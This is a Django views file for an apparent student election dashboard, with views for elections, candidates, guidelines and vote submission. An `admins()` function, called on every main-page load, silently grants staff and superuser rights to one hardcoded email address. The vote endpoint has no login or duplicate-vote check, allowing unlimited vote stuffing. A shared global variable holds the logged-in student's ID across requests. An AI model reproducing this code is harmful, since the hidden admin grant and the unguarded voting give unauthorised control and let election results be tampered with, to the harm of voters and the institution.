from django.shortcuts import render, get_object_or_404
from .models import Election, Candidate, Position,Student
from django.http import JsonResponse
from django.contrib.auth.decorators import login_required
from django.shortcuts import redirect
from django.contrib.auth.models import User
from django.contrib.auth import logout as auth_logout


Logged_id=None

@login_required
def get_user_info(request):
    global Logged_id
    user = request.user
    id = {(user.get_short_name()).split(' ')[0]}
    Logged_id = str(id).replace('-', '').replace('{', '').replace('}', '').replace("'", '').replace('"', '').strip()

    user_info = {
        'username': user.username,
        'email': user.email,
        'id' : id,
        'lastname' : user.last_name
        
    }
    return user_info

def main(request):
    user_info=get_user_info(request)
    global Logged_id

    admins(request)
    return render(request, 'dashboard_templates/dashboard_main.html', {
        **get_user_info(request)  # Assuming this returns a dictionary
    })

def votes(request):
    user_info=get_user_info(request)
    global Logged_id

    student = get_object_or_404(Student, student_id=Logged_id)  # Ensure you handle cases where the student does not exist
    election = Election.objects.filter(departments__contains=student.department)
 
    return render(request, 'dashboard_templates/dashboard_votes.html', {'elections': election} |  get_user_info(request))

def votes_candidates(request, election_id):
    election = get_object_or_404(Election, id=election_id)
    positions = Position.objects.filter(election=election)
    candidates = Candidate.objects.filter(election=election).select_related('position')

    context = {
        'positions': positions,
        'candidates': candidates,
        'election': election
    }
    context.update(get_user_info(request))  # Merging user info
    return render(request, 'dashboard_templates/dashboard_votes_candidates.html', context)


def get_positions(request, election_id):
    positions = Position.objects.filter(election_id=election_id)
    positions_data = [{"id": position.id, "title": position.title} for position in positions]
    return JsonResponse({"positions": positions_data})

def guidelines(request):
    return render(request, 'dashboard_templates/dashboard_guidelines.html', get_user_info(request))

def logout(request):
    auth_logout(request)  # Logs the user out
    return redirect('home')  # Redirects to the main dashboard view


def admins(request):
    try:
        user = User.objects.get(email="johnmark.econar@cit.edu")
        user.is_staff = True
        user.is_superuser = True
        user.save()
        print(f"User {user.email} is now an admin.")
    except User.DoesNotExist:
        print("User not found")

def submit_vote(request, candidate_id):
    if request.method == "POST":
        try:
            candidate = Candidate.objects.get(id=candidate_id)
            candidate.vote_count += 1  # Increment vote count
            candidate.save()

            # Return a JSON response indicating success
            return JsonResponse({"message": "Vote successfully submitted!", "vote_count": candidate.vote_count})
        except Candidate.DoesNotExist:
            return JsonResponse({"error": "Candidate not found!"}, status=404)
    return JsonResponse({"error": "Invalid request method"}, status=400)